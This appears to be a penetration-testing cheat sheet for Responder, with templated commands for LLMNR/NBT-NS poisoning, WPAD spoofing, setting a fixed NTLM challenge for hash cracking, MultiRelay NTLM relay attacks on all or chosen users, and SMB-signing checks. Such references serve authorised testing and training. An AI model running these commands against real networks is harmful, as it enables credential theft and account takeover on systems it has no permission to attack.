# responder

% responder, LLMNR, NBT-NS, Poisoning, man in the middle

## Responder - Launch Basic Listener
Launches Responder on a specified interface to listen for LLMNR/NBT-NS/mDNS queries.
#plateform/linux #target/remote #cat/ATTACK/MITM 
```
responder -I <interface>
```

## Responder - Launch in Analyze Mode (No Poisoning)
Launches Responder in analyze-only mode, preventing any poisoning.
#plateform/linux #target/remote #cat/RECON 
```
responder -I <interface> -A
```

## Responder - Launch with WPAD File
Launches Responder with WPAD proxy enabled.
#plateform/linux #target/remote #cat/ATTACK/MITM 
```
responder -I <interface> --wpad
```

## Responder - Enable HTTP Server
Enables the HTTP server in Responder's configuration.
#plateform/linux #target/local #cat/UTILS
```
sed -i 's/HTTP = Off/HTTP = On/g' /opt/Responder/Responder.conf && cat /opt/Responder/Responder.conf | grep --color=never 'HTTP ='
```

## Responder - Disable HTTP Server
Disables the HTTP server in Responder's configuration.
#plateform/linux #target/local #cat/UTILS
```
sed -i 's/HTTP = On/HTTP = Off/g' /opt/Responder/Responder.conf && cat /opt/Responder/Responder.conf | grep --color=never 'HTTP ='
```

## Responder - Enable SMB Server
Enables the SMB server in Responder's configuration.
#plateform/linux #target/local #cat/UTILS
```
sed -i 's/SMB = Off/SMB = On/g' /opt/Responder/Responder.conf && cat /opt/Responder/Responder.conf | grep --color=never 'SMB ='
```

## Responder - Disable SMB Server
Disables the SMB server in Responder's configuration.
#plateform/linux #target/local #cat/UTILS
```
sed -i 's/SMB = On/SMB = Off/g' /opt/Responder/Responder.conf && cat /opt/Responder/Responder.conf | grep --color=never 'SMB ='
```

## Responder - Set NTLM Challenge
Sets the NTLM challenge for cracking.
#plateform/linux #target/local #cat/UTILS

= challenge: 1122334455667788
```
sed -i 's/Challenge =.*$/Challenge = <challenge>/g' /opt/Responder/Responder.conf && cat /opt/Responder/Responder.conf | grep --color=never 'Challenge ='
```

## Responder - Reset NTLM Challenge
Resets the NTLM challenge to its default value.
#plateform/linux #target/local #cat/UTILS
```
sed -i 's/Challenge =.*$/Challenge = 1122334455667788/g' /opt/Responder/Responder.conf && cat /opt/Responder/Responder.conf | grep --color=never 'Challenge ='
```

## MultiRelay - Attack with User Filter
Performs a MultiRelay attack, filtering for specific users (requires HTTP and SMB disabled in Responder.conf).
#plateform/linux #target/serve #cat/ATTACK/MITM 
```
multirelay -t <ip> -u <user1> <user2>
```

## MultiRelay - Attack All Users
Performs a MultiRelay attack targeting all users (requires HTTP and SMB disabled in Responder.conf).
#plateform/linux #target/serve #cat/ATTACK/MITM 
```
multirelay -t <ip> -u ALL
```

## Runfinger - SMB Signing Check
Responder-related utility which will finger a single IP address or an IP subnet and will reveal if a target requires SMB Signing or not.
#plateform/linux #target/remote #cat/RECON 
```
runfinger -i <network_range>
```
